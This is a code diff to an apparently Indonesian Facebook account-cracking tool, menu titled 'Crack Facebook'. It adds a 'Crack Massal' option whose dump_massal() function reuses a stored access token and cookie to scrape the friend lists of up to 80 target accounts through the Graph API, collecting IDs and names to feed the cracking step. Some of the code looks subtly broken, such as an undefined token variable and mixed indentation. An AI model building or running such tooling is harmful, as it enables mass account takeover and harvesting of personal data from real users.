@@ -347,7 +347,8 @@ def daftar_menu():
 [bold green]3[bold white]. Crack User Dari Like Postingan
 [bold green]4[bold white]. Keluar ([bold red]Logout[bold white])
 [bold green]5[bold white]. Ganti UA
-[bold green]6[bold white]. cek akun""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
+[bold green]6[bold white]. cek akun
+[bold green]7[bold white]. Crack Massal""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
     query = Console().input("[bold hot_pink2]   ╰─> ")
     if query == '1' or query == '01':
         try:
@@ -391,8 +392,10 @@ def daftar_menu():
         except:exit()
     elif query == '5' or query == '05':
         uap()
-    elif query == '6' or query == '0':
+    elif query == '6' or query == '06':
         ceker()
+    elif query == '7' or query == '07':
+	dump_massal()
     else:
         Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
 ### DUMP ###
@@ -494,7 +497,52 @@ class dump:
             Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
             return 2
 
-
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
+		jum = int(input(f' [+] Mau Berapa Idz Target  : '))
+	except ValueError:
+		print(' [+] Wrong input ')
+		exit()
+	if jum<1 or jum>80:
+		print(f' [+] Pertemanan Tidak Publik  ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(f' [+] Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print(' [+] Unstable Signal ')
+			exit()
+	try:
+		print(f' [+] Total Idz Target Yang Terkumpul : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'')
+		print(' [+] Unstable Signal ')
+		exit()
+	except (KeyError,IOError):
+		print(f' [+] Pertemanan Tidak Public ')
+		time.sleep(3)
+		exit()
 
 
 
